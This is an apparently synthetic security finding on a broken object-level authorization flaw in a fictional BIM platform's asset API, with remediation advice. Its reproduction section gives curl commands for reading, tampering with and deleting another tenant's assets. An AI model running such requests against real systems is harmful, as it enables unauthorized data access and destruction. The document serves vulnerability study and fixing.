## System

- System: BuildCore BIM Collaboration v2.0.0
- Domain: CONSTRUCTION / BIM PLATFORM
- Example ID: BOLA-0078
- Risk ID: RISK-34-078

## Findings

### 1. Pattern 3.4 — Implicit Trust in Client-Supplied Asset IDs on `/api/v2/assets/:id` (HAR Primary)

**HAR evidence**: JWT `X-Tenant-ID: ORG-8D06`. Request: `GET /api/v2/assets/ASS-2078`. Response: HTTP 200 OK with `"tenantId": "ORG-6DD0"`, `"ownerId": "other-user-8d066dd0"`, `"sensitiveData": "CONFIDENTIAL: cross-tenant data for ORG-6DD0"`.

**Pattern 3.4 (Implicit Trust in Callbacks — Insecure Design)**: the asset handler implicitly trusts the client-supplied `asset_id` without verifying that the requesting user owns or is authorized to access that asset. When a BIM user initiates an asset operation (model load, render, export), the server uses the `asset_id` from the request directly — trusting that it belongs to the requestor. Section 3.0: "Application code does NOT use tenant_id in authorization checks" (RISK-34-078). The insecure design assumption is: "if a user sends a valid `asset_id`, it must be theirs." This implicit trust is broken — any `asset_id` from any tenant is equally resolved.

**Construction / BIM impact**: assets represent BIM models (IFC files), architectural blueprints, structural engineering data, or construction cost estimates. Cross-tenant read exposes a competitor's proprietary BIM models and project specifications. Cross-tenant PATCH corrupts another construction firm's BIM data. Cross-tenant DELETE destroys BIM project files — potentially billions in project data. All operations are enabled by the insecure design of implicitly trusting the client-supplied `asset_id`.

## Reproduction

**Step 1 — Baseline:**

```bash
curl -s "https://api.buildcore-bim-c.example.com/api/v2/assets/ASS-1078" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-8D06>" \
  -H "X-Tenant-ID: ORG-8D06"
```

Expected: `tenantId: "ORG-8D06"` — own BIM asset.

**Step 2 — Cross-tenant BIM asset read (primary HAR attack):**

```bash
curl -s "https://api.buildcore-bim-c.example.com/api/v2/assets/ASS-2078" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-8D06>" \
  -H "X-Tenant-ID: ORG-8D06"
```

Expected secure: HTTP 403 or 404.  
Expected vulnerable: HTTP 200 with `tenantId: "ORG-6DD0"` and competitor BIM `sensitiveData`.

**Step 3 — Cross-tenant BIM asset PATCH (implicit trust write exploitation):**

```bash
curl -s -X PATCH "https://api.buildcore-bim-c.example.com/api/v2/assets/ASS-2078" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-8D06>" \
  -H "X-Tenant-ID: ORG-8D06" \
  -H "Content-Type: application/json" \
  -d '{"status": "corrupted", "sensitive_data": "tampered_by_attacker"}'
```

Expected secure: HTTP 403.  
Expected vulnerable: HTTP 200 — competitor's BIM model data corrupted.

**Step 4 — Cross-tenant BIM asset DELETE:**

```bash
curl -s -X DELETE "https://api.buildcore-bim-c.example.com/api/v2/assets/ASS-2078" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-8D06>" \
  -H "X-Tenant-ID: ORG-8D06"
```

Expected vulnerable: HTTP 200 — competitor's BIM project file destroyed.

## Evidence

- **HAR**: `GET /api/v2/assets/ASS-2078` with `ORG-8D06` JWT → HTTP 200 → `tenantId: ORG-6DD0` with `sensitiveData`.
- **Section 4.0 (RISK-34-078)**: Pattern 3.4 — GET/PATCH/DELETE lack tenant/owner filter.
- **Section 3.0**: Application code does not use `tenant_id` in authorization checks.

## Remediation

- **Add `WHERE tenant_id = $jwt_tenant_id AND owner_id = $jwt_sub`** to GET/PATCH/DELETE handlers (RISK-34-078, unblock #DB-178).
- **Never implicitly trust client-supplied IDs**: every asset operation must validate `tenant_id` match before resolving the asset.
- **Centralize authorization middleware**: asset ID resolution gated by ownership check.
- **Regression test**: Tenant A token requests Tenant B `asset_id` — assert HTTP 403/404.
